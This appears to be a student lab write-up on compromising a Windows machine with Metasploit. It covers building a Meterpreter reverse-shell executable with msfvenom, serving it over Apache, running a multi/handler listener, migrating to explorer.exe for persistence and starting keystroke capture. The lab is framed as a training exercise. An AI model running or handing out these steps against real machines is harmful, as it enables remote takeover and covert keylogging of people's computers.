# Compromising-windows-using-Metasploit
Compromising windows using Metasploit
# Metasploit
Compromising windows using Metasploit

# AIM:

To Compromise windows using Metasploit .

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:

Find the attackers ip address using ifconfig
## OUTPUT:

<img width="910" height="348" alt="image" src="https://github.com/user-attachments/assets/5f97e01a-945d-460b-8e36-0d25d4dc4b1c" />


Create a malicious executable file fun.exe using msfvenom command
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
## OUTPUT:

<img width="908" height="138" alt="image" src="https://github.com/user-attachments/assets/72415960-ed03-4c1d-b8e3-4dadd3a921b1" />

copy the fun.exe into the apache /var/www/html folder
## OUTPUT:
<img width="556" height="51" alt="image" src="https://github.com/user-attachments/assets/9361358e-3479-4807-af87-403cc9aa4cdc" />


Start apache server
sudo systemctl apache2 start
## OUTPUT:

<img width="627" height="57" alt="image" src="https://github.com/user-attachments/assets/ef0c3851-f9a5-47af-b2e1-bd14a14e534e" />

Check the status of apache2
## OUTPUT:

<img width="961" height="375" alt="image" src="https://github.com/user-attachments/assets/8fd646bf-8cde-4bb8-9759-f9760eb59f0b" />


Invoke msfconsole:
## OUTPUT:

<img width="933" height="745" alt="image" src="https://github.com/user-attachments/assets/d94e2960-5ff9-45bb-917f-429fde6b419d" />



Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
## OUTPUT:
<img width="937" height="738" alt="image" src="https://github.com/user-attachments/assets/57b7a7cf-5c99-4281-a0f6-8ca36482c039" />



Starting a command and control Server
use multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0

## OUTPUT:

<img width="627" height="167" alt="image" src="https://github.com/user-attachments/assets/e1cfdc89-c6d3-4a88-a1cd-f41ec3eca80f" />



On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
http://192.168.1.2/fun.exe  ( Replace IP address appropriately)
The file "fun.exe" downloads. 
## OUTPUT:


<img width="1536" height="960" alt="Screenshot 2026-08-24 231839" src="https://github.com/user-attachments/assets/82702277-3294-4f80-9118-4ad61070b770" />

Bypass any warning boxes, double-click the file, and allow it to run.
## OUTPUT:

<img width="1536" height="960" alt="Screenshot 2026-08-24 231939" src="https://github.com/user-attachments/assets/cf87a5ea-e655-4c93-9a43-ec30372286af" />

On kali/parrot give the command exploit
## OUTPUT:

<img width="387" height="36" alt="image" src="https://github.com/user-attachments/assets/85224e60-9e62-42e1-9a17-01f779b52592" />

To see a list of processes, at the meterpreter > prompt, execute this command:
ps  ⇒ can see the fun.exe process running with pid 1156
## OUTPUT:

<img width="385" height="120" alt="image" src="https://github.com/user-attachments/assets/2d6f6966-bab8-4f00-942f-1e570683bdd5" />

The Metasploit shell is running inside the "fun.exe" process. If the user closes that process, or logs off, the connection will be lost.
To become more persistent, we'll migrate to a process that will last longer.
Let's migrate to the winlogon process.
At the meterpreter > prompt, execute this command:

migrate -N explorer.exe
## OUTPUT:

<img width="618" height="370" alt="548616406-577cc3a3-ba98-4d4c-8d3a-0a504115bbdb" src="https://github.com/user-attachments/assets/4eebabe8-0666-4535-b898-4fdb1f2fe08f" />
at meterpreter > prompt, execute this command:
netstat
A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
Notice the "PID/Program name" value for this connection, which is redacted 

Post Exploitation
The target is now owned. Following are meterpreter commands for key capturing in the target machine
keyscan_start	Begins capturing keys typed in the target. On the Windows target, open Notepad and type in some text, such as your name.

## RESULT:
The Metasploit framework is  used to compromise windows and is examined successfully.


